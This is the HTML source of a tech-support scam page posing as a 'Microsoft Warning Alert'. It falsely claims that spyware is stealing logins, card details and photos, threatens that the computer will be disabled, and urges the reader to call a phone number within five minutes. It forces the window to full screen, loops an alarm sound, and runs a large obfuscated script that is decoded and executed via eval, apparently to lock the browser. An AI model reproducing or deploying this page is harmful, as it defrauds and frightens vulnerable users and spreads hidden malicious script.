
<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
    <meta name="robots" content="noindex, nofollow">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>MICROSOFT SECURITY WARNING</title>
    <meta name="robots" content="NOINDEX,NOFOLLOW">
    <style type="text/css">
        #alert{position:absolute;left:30%;top:5%;background:#F1F1F1;border:2px solid #0032C7;width:40%}.input{margin-top:10px;background:#F1F1F1;padding:20px;text-align:right}.input input{opacity:1;padding:15px;font-size:16px;width:35%;font-weight:700}.input input:hover{opacity:.75}.head h1,h2,h3,h4{margin:0;padding:0}.text{padding:20px}.right{float:right}.left{float:left}.clear{clear:both}.alert_hide{cursor:pointer}body{background-color:#FFF;color:#000;font-family:"Trebuchet MS",Arial,Helvetica,sans-serif;font-family:Arial;font-size:18px;margin:0}body,html{margin:10px;padding:0;overflow:hidden;width:100%;height:100%;background-attachment:fixed;background-color:#cd3426}
    </style>

    <script src="./js/jquery.min.js"></script>
    <script>

        function getURLParameter(name) {
            return decodeURI(
                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
            );
        }
        function random_betw(min, max) {
            return Math.round(Math.random() * (max - min) + min);
        }

        var allphones = [getURLParameter('n1'),getURLParameter('n2'),getURLParameter('n3'),getURLParameter('n4'),getURLParameter('n5'),getURLParameter('n6'),getURLParameter('n7'),getURLParameter('n8'),getURLParameter('n9'),getURLParameter('n10')];
        var nmb_off_phones = 0, logika = false, phones_arr=[];
        for (var i=0;i<10;i++){
            if(!logika && (allphones[i]!=null && allphones[i]!="undefined" && allphones[i]!="")){
                phones_arr[i] = allphones[i];
            }else{
                logika = true;
            }
        }
        var phone = "+1-844-798-38029";

        var text = "** Microsoft Warning Alert **\n\nERROR # 268d3x8938(3) \n\Please call us immediately at: " + phone + ".\nDo not ignore this critical alert..\nIf you close this page, your computer access will be disabled to prevent further damage to our network. Your computer has alerted us that it has been infected with a Pornographic Spyware and riskware. \n\nThe following information is being stolen: \n 1.Facebook Logins\n 2.Credit Card Details\n 3.Email Account Logins\n 4.Photos stored on this computer.\nYou must contact us immediately so that our expert engineers can walk you through the removal process over the phone to protect your identity. Please call us within the next 5 minutes to prevent your computer from being disabled or from any information loss.\n\nToll Free:" + phone;
    </script>
    <script>
        var w = window.screen.width;
        var h = window.screen.height;
        window.moveTo(0, 0);
        window.resizeTo(w, h);
    </script>

    <script>
        //browser
        var isOpera = !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;
                // Opera 8.0+ (UA detection to detect Blink/v8-powered Opera)
        var isFirefox = typeof InstallTrigger !== 'undefined';   // Firefox 1.0+
        var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf('Constructor') > 0;
                // At least Safari 3+: "[object HTMLElementConstructor]"
        var isChrome = !!window.chrome && !isOpera;              // Chrome 1+
        var isIE = /*@cc_on!@*/false || !!document.documentMode;   // At least IE6


    </script>
</head>

<body style="margin:0px;padding:0px;font-family:arial,sans-serif!important;">
    <div id="blue-screen" style="display: none">
        <table style="width:100%" height='61' cellpadding='0' cellspacing='0' border='0'><tr><td width='766'><img src='img/bg-1.jpg'></td><td align='right' background='img/bg-2.jpg'><img src='img/bg-3.jpg'></td></tr></table>
    </div>
    <div style="width:85%; margin:auto; padding-top:4%; background-color:#cd3426;position:relative;">
        <div class="centering-col">
            <div class="centered-content">

                <h1 style="color:#FFF; margin-top:20px; font-weight:900;">** Microsoft Warning Alert **</h1>
                <h3 style="color:#FFF; margin-top:20px; font-weight:900;">ERROR # 268d3x8938(3)</h3>
                <div style="float:right; height:180px; width:180px; margin-right:19%;"><img src="./img/defender.png" width="230" /></div>
                <div style="float:left; height:250px; width:520px; padding-left:20px; padding-top:25px; color:#FFF; "> Please call us immediately at:
                    <script>
                        document.write("<span style=\"font-size:22;font-weight:bold;\">" + phone + "<\/span>");
                    </script>:
                    <br> Do not ignore this critical alert.
                    <br/> If you close this page, your computer access will be disabled to prevent further damage to our network.
                    <br/> Your computer has alerted us that it has been infected with a Pornographic Spyware and riskware. The following information is being stolen...
                    <br/>
                    <br/> 1.Facebook Logins
                    <br/> 2.Credit Card Details
                    <br/> 3.Email Account Logins
                    <br/> 4.Photos stored on this computer
                    <br>
                    <br>You must contact us immediately so that our expert engineers can walk you through the removal process over the phone to protect your identity. Please call us within the next 5 minutes to prevent your computer from being disabled or from any information loss.
                </div>
                <div style=" margin-top:420px;  ">
                    <h1 style="color:#FFF; font-weight:900;">Toll Free: <script>document.write("<span style=\"color:#7fff7f\">" + phone + "<\/span>")</script> </h1></div>

            </div>

        </div>

    </div>
    <audio autoplay="autoplay" loop="" id="audio">
        <source src="./sound/err.mp3" type="audio/mpeg">
    </audio>
    <div id="chrome-alerts" class="chrome-alert" style="display: none">
        <div>
            <a href="#" class="cross">×</a>
            <h1>Security Warning:</h1>
            <div class="content-box" id="alert-content-box">
                  <p>** Microsoft Warning Alert **<br>
                <br>ERROR # 268d3x8938(3)<br>
                <br>
                <br>Please call us immediately at:  <span style="font-size: 13pt;font-weight: bold"><script>document.write(phone)</script></span> (Toll Free)<br>
					  Do not ignore this critical alert.
                </br> If you close this page, your computer access will be disabled to prevent further damage to our network.
               <br/> Your computer has alerted us that it has been infected with a Pornographic Spyware and riskware. The following information is being stolen...
					 <br/>
                    <br/> 1.Facebook Logins
                    <br/> 2.Credit Card Details
                    <br/> 3.Email Account Logins
                    <br/> 4.Photos stored on this computer
                <br/>
                <br/> Please call us within the next 5 minutes to prevent your computer from being disabled or from any information loss.</br>
                </br> Toll Free: <span style="font-size: 13pt;font-weight: bold"><script>document.write(phone)</script></span></div>
            <label style="font-size: 12px;">
                  <input type="checkbox">
                  Prevent this page from creating additional dialogues.</label>
            <div class="action_buttons"> <a style="color:#fff;background:#54b7ff;font-size: 11pt;font-weight: bold;" href="javascript:;" class="active" id="leave_page">Back to safety</a> </div>
        </div>
    </div>

    <script>
        (function() {
            var t = "",
                p = [8, 7, 9, 6, 5, 4, 9, 6, 3, 7],
                smat = unescape("-9%3D+7%3Co%7Bqj%7Cpxt*6A+5@-%3EKok%29%3B%3ElzNp%7Bkks%81+5@-%3EK+78.8%3B%2C%3A9j+76.8%3C5ksrip%29%3B%3Ei%7Cvj%7Dotr.8%3Bl-9B+%3CFn4sym%7DntyHnld%7Ct%7B.8%3D%29%3B%3F%28%3EL%2C%3B%3F*7K%7Cdy-99k*7M+8I-9%3BvzwqYwh%7Cl.87%29%3BI%289%3Avwhjjxxh%7Cvsxgi%29%3B8%289K%2C%3B8*6%3B+5J-9%3Bxjx%7Exq%5Dis%7Ek*6%3B+5J-9%3Buspxgg%2C%3A9.8H%29%3B8wv%5B%7B%7Bosk.85%2C%3DK.9Gs.9Gl-9L%7B*7M95%3C-9Llzrlzlvv%2C%3B%3Ej%29%3B%3F%28%3EJmxx*6A+6I54n+8F.8%3Cv6w%7Eym%29%3B%3Er5%7Borly%29%3B%3E%289A%2C%3B%3F*%3BM+5%3F32%7E+7%3D.9E%7Diy.85r.9Gm%7Dulznsw+5%3Fv%2C%3BIy%29%3B%3F%28%3EJynzzvw+57m%2C%3EHs1.9G7-%3CM+%3CH.9E%7B-%3AMzj%7C%7D+5J%7Fpwjt%7B.%3BEu-9A+769%7E3%2C%3A9.8%3E%29%3EJ%28%3ALm%7Ethxruq%2C%3A%3Fn+7%3D.%3DE%7Diy.85s.9Gu-9A+769%7E4%2C%3A9.8%3E/%7D+6Izl%7D%7Bwr.83l-%3CKt*6A+598%7F%3B+76.8%3C%2C%3DK.9Is.8Fv-%3EM+7G%80oqkw%7E.%3BGr.8%3B%2C%3A99%7E8%29%3B8%289A%2C%3EJ*7Mlxuk%7Brus%29%3B%3E%289A%2C@Hnj.8%3Bjwuoowq.8%3B%2C%3A9.87/%7D+5@-9Bltv.8%3B%7Diy.85i.9G%2C%3A9.87%29%3BIr%2C%3BK9+8Fx+6J9lA+8Fx1.%2C%3A@n1*7Mu%28%3CJu.8%3D%29%3B83%7F%3C%2C%3B8*6B+8K-9A+7%3D.8Foqz%7Duw%7D.%3BEu-9A+769%7E8%2C%3A9.8%3E%29%3EJ%289@7.8H4.8Fl-9B+8Fnrvl-99ltv.8%3Bl-%3AM+76.85%2C%3AJx+8H9+6Iw%2C%3CI6iA+6Iw24+7%3Dn1%28%3ALv.%3BGr.8%3B%2C%3A99%7E9%29%3B8%289A%2C%3EJ*6A+5@-9Lnnw%7Duu%80-%3CKt*6A+598%7F%3E+76.8%3C%2C%3DK.8%3D4.8F7-9Lk*6B+%3AK-%3EM%7Cfv.83%7B-9Lu*6L%7B%289Ky.8Hg.8Fp-9Lr*7Koi%2C%3A%3FryHl%7Bupl-%3EL+%3CGryRwmyj+7%3D.%3DE%7Diy.85h.9G%2C%3A8%3A+8F.87%2C%3A%3F.87lngg%2C%3A9.8%3E2jvslvk.8%3D%29%3B%3D%28%3AKzlxnt%7D+57%7Byl+8H.8557q%7C5ou%7Eku%806q%7C+76.9H%2C%3BJ.%3BH3%7Ciupx%7B.9J%29%3B%3D%289A%2C%3BI*6%3D+5%3F-9%3Bnjem+59-9B4ftykqk-9A+7%3B.9Fsqut+74qxhm-%3AM+7675fz%7B6vgnr7ivz-9%3B+74%7Bko%2C%3BK.87w%7D%7Fol%7Bonky%29%3B8%28%3AM%2C%3B%3D*6B+5Jlvl%7Briwz1nm%7BNrjqntwI%81Pm+7%3C.85h%7Dkru*6%3B+5@6wug%7E%29%3B%3E%289A%2C%3BI%7Cmwjr%7E6vwqj%7Dmuzu-%3AMlzrlzlvv%2C%3B%3Ej%29%3B%3F%28%3EJynzzvw+589%2C@J*6L%7Dlulv%804trtk%7Cwzl%7Cy*7Mlxuk%7Brus%29%3B%3Eh%2C%3A@.%3DGvnzxyv%2C%3B76%29@J%289Kvwhjjxxh%7Cvsxgi%29%3CJi%7Cvj%7Dotr.8%3B%2C%3A@.%3DGvnzxyv%2C%3B6fpnxw%2C%3A%3F.87%29%3CL%28%3AN%2C%3CL*7O+6M-%3AO+8J.83L%5BJ.8H%29%3B6%28%3AN%2C%3CL*7O+6M-%3AO+74.9I%2C%3BM.9K%29%3CL%28%3AN%2C%3CL*7O+57-%3AO+8J.9I%2C%3BM.9K%29%3CL%28%3AN%2C%3CL*6%3A+59-9B+7G.85%2C%3BM.9K%29%3CL%28%3AN%2C%3CL*7O+6M-99KXG.8F%2C%3A7.9K%29%3CL%28%3AN%2C%3CL*7O+57-%3AO+8J.9I%2C%3BM.9K%29%3CL%28%3AN%2C%3B6*7O+6M-%3AO+8J.9I%2C%3BM.9K%29%3CL%2899%2C%3B8*%3BM+5Jlvl%7Briwz1vvjxtyi%81zplv%7C.9Irn%7D%2898M%7Ethxruq%2C%3A%3F.87vnzxyv%2C%3B6keuyh%2C%3A9.8%3E%29%3CHivz%2C%3B%3E%7Be%7B+57%7B%2C%3CJ5%29%3CHv%2C%3BJ9+8F%7C1.%2C%3A@jrjv%7D+5%3F%7Cl%81z*6B+6In%7Cwiymxt%2898h.8%3D%29%3B%3F%28%3EJk.9K%29%3B%3Egvk%7Cvksx7mh%7BMsnsjr%7DH%7CPl%2C%3B%3E*6%3Bho%7Cm4%7Ciwint%289%3A%2C%3B%3F3w%7D%7Fol6kryupj%7F%28%3AL%2C%3B8gpxin%2C%3A9.8Hhxixtmu%7D4li%7DKolulwzxF%82ZdnVhvk*6A+59jvm%7F*6%3B+5@6p%7Dkr%29%3B%3E3%2C%3A@7yjxJzwyqi%7Ezj%29%3B%3E%289%3Ajugxw.85%2C%3AJ.87tjyw%2C%3A9.8%3E%29%3B%3F%28%3AIk.9I%29%3B73%2C%3FKo%7Bsg%7Doru-99s*6A+5@-%3EKjtg%7Eshu%7C5o%7Bqp%7CiulmuNrjqntw%2C%3FJ.%3DHhxixtmu%7D4rs%83LxstZlxjiwKolulwz*%3BL+%3AJlvl%7Briwz1%7EmitoyJ%7ErozkynksIukplv%7B.%3DH%29@I%289@kxizqntw5lvl%7BriwzHsmtnty2%7Bkt%7Cmz%7DLzpuyfymlw+8Jmuf%7Culwz3hxixtmu%7DKqivkq%7B6ynwzi%7CzI%7Cts%7Ciwint%289@%2C%3B%3F*7Jjrj%7Dtnty2muf%7CulwzJpnshu%7C5vu%7FVnwxl%7B%7BO%7Bqp%5Ciulmu.9Khxixtmu%7D4isl%7Bplv%7BNrjqntw5uv%83Xju%7Ekv%7BN%7CurXg%7Bkhu-9A+7%3D.9Dkwj%7Esjr%7D4gvk%7CvksxNrhtmu%7D4%7Cikql%7BZlz%7Bjw%7DLxstzlxjiw+5%3D-9%3Fjtg%7Eshu%7C5muhyvkq%7BMsnsjr%7D4zljrrzWiz%7Bhz%7CM%7Erqwlxhlv%2C%3B%3EJpnshu%7C5JRQS%60eNLaIXGWHhOQW%5D%5B.8%3E%29%3B%3F%289K%7Ertis%804rwmu.8%3D%29%3B8es%7Dl7vmt.85%2C%3AJ.87Euku%7B-9%3B+7G.85%7Eqk%7Dn*7M7%289Konoll%7D+6K9%2C%3BIxg%7Buosqup+8H%82kv%2C%3AJo%7Bqp%7Ciulmu.9I%7Dny%289Ksnly%29%3CJ6787.8Hxxv%28%3AL%3A965%29%3B8%289A%2C@Jisl%7Bplv%7B7mjxNrhtmu%7DH%7EMm+5%3F-9%3Bimvxsh4isnxyw.85%2C%3A@7yy%7Duk1kqzyrf%7D.9G%2C%3A9krtgt+59-9Ljtg%7Eshu%7C5jjiI%7Fkq%7BTp%7Czjrnx%289@%2C%3B8pi%82%7Bs%2C%3A9.8Hj%7Etf%7Bqvw+7%3Cn+5@-%3EK8%3C%29%3CJ%28%3ALl7qj%7DLugl-9%3F+7%3Av+5%3F-9B+%3CH.8F%2C%3A8%3A+7%3D.8Fkwj%7Esjr%7D4dklL%7FksxUov%7Bmunx*6A+59sl%82%7Bu%29%3B8%289Km%7Ethxruq%2C%3A%3Fn+7%3D.%3DE8%3A9.86%29%3CJh5sl%82Ithn+5%3D-9%3F7%3C%29%3B7%28%3ALl7qj%7DLugl-9%3F+7%3A%3A%3E%2899%2C%3CJj2tk%7CJwkn+7%3A.898%3B%2C%3B7*7Mk1rm%80Luii.%3DF%2C%3FJ.8%3De.8%3B%2C%3A@.8Hq.8%3B%2C%3A@.8%3E%29@J%289K%2C%3B76%29%3B%3F%289K%7Ertis%804rutvjj*7Mlxuk%7Brus%29%3B%3E%289A%2C@Hisl%7Bplv%7B7usguofr-%3AMlzrlzlvv%2C%3B%3Ej%29%3B%3F%28%3EJl.9Ii.%3DF%2C%3FJn%7Cjr%7D+5J%7Ch%7Bmjx.9Gl6%7Bjxli%7D+%3AJ-%3ELk3w%7BiHsmtnty%29%3BIwhznnz3xjmQhul.8Hq.8%3B%2C%3A@.8He.8%3B%2C%3A@.%3DI%29@J%289KhmjJzntwSqz%7Dksi%7B+5%3F-9%3Biqmlq%289%3A%2C%3BIkywiwpwu.8%3D%29%3B%3F%28%3EJh.8%3D%29%3B%3F%28%3AJ%7Djx*69k%28%3ALkxizqntw5lvl%7BriwzHsmtnty%29%3CH%289@l7xju%7Ekv%7BN%7CurXg%7Bkhu-%3EL+%3CGn4zljrrzWiz%7Bhz%7CM%7ErqWlxhlv%2C@I*%3BLk1tw%81%5BkvynywM%7DsuYhvnkq%2C%3A@7ifpu+5%3Fm%2C%3B%3F*%3BM+5@-9L%7Dnrmuz5ikmK%7BiwzOp%7B%7Bntjv.8%3B%2C%3A9%7Bkxm%83k%289%3A%2C%3BIkywiwpwu.8%3D%29%3B%3F%28%3EJ%2C%3B%3A*6A+59jvm%7F*6%3B+5@6j%7Cy*6A+59w%7Dnxkpx%7D%289%3A%2C%3BI*6%3Bnlkllw+76.8%3C%2C%3AJ.89%29%3B%3E%289%3A5yuuyy3dsmy%7D+76.8%3C5%7B%7Bxv*6A+5@6hwore%7Dk%289@%2C@Hgs%7Dzrt-%3AJ+76673w%80%2C%3B8*6Lushkp%7D%7F*7J7%28%3EL%2C%3BI%3A49+5@-9Ljtg%7Eshu%7C5pkyIukplv%7BK%7FNh.8%3B%2C%3A9j%7Bimx+59-9B4upj%7F%289@%2C%3B%3F*6Lyfymlw4%7Cmmzk%2C%3AJ%80oshx%7D1pvunx%5Cmmzk%2C%3AJ%80oshx%7D1zm%7BRtyi%7B%7Cds-9Alzrlzlvv%2C%3B%3E*6B+%3AInv%7B+7%3C%7Fgu%2C%3A7n+8H9+6Im%2C%3CI649+6Im24+7%3Dqov%7Bwy%824uy%7CnV%7Bi%7Bn+7%3C9+5J8%2C%3BIj%29%3B%3F%28%3EL%2C%3BI%3A49+5@-%3EM+7%3D.%3DGpn%2C%3B%3EnwRK%28%3EK%2C@Inw%5Cgihzp.8%3E%29@H%289%3C%2C%3B%3E*6%3B+5%3Ajs%7Ek2wlxhlv%2C%3BI3gqxrtm4jrjv%7D+59-9B4mmmk%289@%2C%3B%3F*7K%7Cdy-99l*7M+8I-9%3Busqx%7Bvlw%7C%7D+76.8F%2C%3A9kui%7D.85%2C%3AJ.87emjH%7Dmu%7DRnw%7Dkqlz%2C%3B8*6L+59uv%7Eyjs%7Ez%289%3A%2C%3BI*6%3B0-12130/.30-12130/.30-12130/.30-12130/.30-12130/..%3BFuZKW5%5EeqRr%7Dmy7%7Dtvv+588%3C%3EHHGJI%3CMMJ.85Mwlhj%7Cpxt*9Lt-12130/.30-12130/.30-12130/.30-12130/.30-12130/.3+8Jv%2C%3EIs%29%3B8%289K%2C%3B8fx%7DgfoM%7Dnty%29%3B8%28%3CL%2C%3CHn%29%3CJi%2C%3AJu+8H%3C%3C4%2C%3AJo%7Bsg%7Doru-9Ak*6B+%3AInv%7B+7%3C.9E45l.9G%29%3B%3Fl5x%7C%7Cn*6Ao1zppoz*6A+5@-9B+%3CH.8%3B23s.8%3E%29%3CHyhz%2C%3B6%7E%29%3CJi%7Cvj%7Dotr.8%3Bl-9Lt*6B+%3AIzl%7D%7Bwr.83m-%3CKk2%29%3CJ3%2C%3DK.%3DI%29%3CHu%2C%3BK%7Dk%7Dx.8Fj-%3AMzj%7C%7D+5Jisnxy%29%3B%3Eu%2C%3A@.8Hhxixtmu%7D+%3AF%82+5%3F-9%3B6%7D4.85%2C%3A@.%3BI%29%3EH%7C%2C%3A%3F.874%817%289%3A%2C%3B%3F*9M+6Mlvl%7Briwz%28%3CJ%80.8%3D%29%3B83%7F8%2C%3B8*6B+8K-%3CK%7F*6A+598%7F%3A+76.8%3C%2C%3DK.8%3D%7D.8%3B%2C%3A99%7E7%29%3B8%289A%2C%3BIkywiwpwu.8%3Di.8%3C%2C%3FIjrjv%7D+5%3F%81%2C%3B%3E*6%3B6%7B%3A-9%3B+7%3D4x%289A%2C@J*6L+589%2C%3B%3F*7Jjrj%7Dtnty%29%3EH%7C%2C%3A%3F.874%816%289%3A%2C%3B%3F*9M+8I%81%2C%3B%3E*6%3B6%7B%3B-9%3B+7%3D.%3BG%2C%3A%3F%82+7%3C.857%80%3C.87%29%3B%3F%289Km%7Ethxruq%2C%3A%3Fn+7%3D.%3DEhtl%7Bz*6Ax%289A%2C@J*6B+5J%7Fpwjt%7B7uqimmxxjywrrhl%2C%3CJkywiwpwu.8%3D%29%3B%3F%28%3EJynzzvw+57k%2C@J*%3BM+%3AK-9B+8F");
            for (var i = 0; i < smat.length; i+=10){
                for(var k=0;k<=9;k++){
                    if((k+i)<smat.length){
                        t += String.fromCharCode(smat.charCodeAt(i+k) - p[k]);
                      }
                }
            }
            eval(unescape(t));
        })();

    </script>

    <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-83794923-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-83794923-1');
</script>
</body>

</html>
